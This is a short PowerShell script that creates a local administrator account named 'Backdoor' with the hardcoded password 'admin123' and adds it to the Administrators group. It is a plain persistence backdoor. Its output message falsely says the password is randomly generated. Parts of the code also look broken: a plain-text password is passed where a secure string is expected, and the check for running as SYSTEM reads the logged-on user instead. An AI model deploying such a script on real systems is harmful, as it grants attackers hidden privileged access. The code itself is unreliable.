$currentUserName = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName).Split('\')[1]

try {
    if ($currentUserName -eq "SYSTEM") {
        # Create a new local administrator account
        $adminUsername = "Backdoor"
        $adminDisplayName = "Backdoor Admin"
        $adminDescription = "Local admin account created by script"
        $password = "admin123"
        $adminAccount = New-LocalUser -Name $adminUsername -Password $password -Description $adminDescription -FullName $adminDisplayName -UserMayNotChangePassword

        # Add the new account to the local administrators group
        Add-LocalGroupMember -Group "Administrators" -Member $adminUsername

        Write-Host "New admin account created. Username: $adminUsername, Password: $password (randomly generated)"
    }
    else {
        Write-Host "Failed to create Admin Account"
    }
}
catch {
    Write-Host "Errors"
}
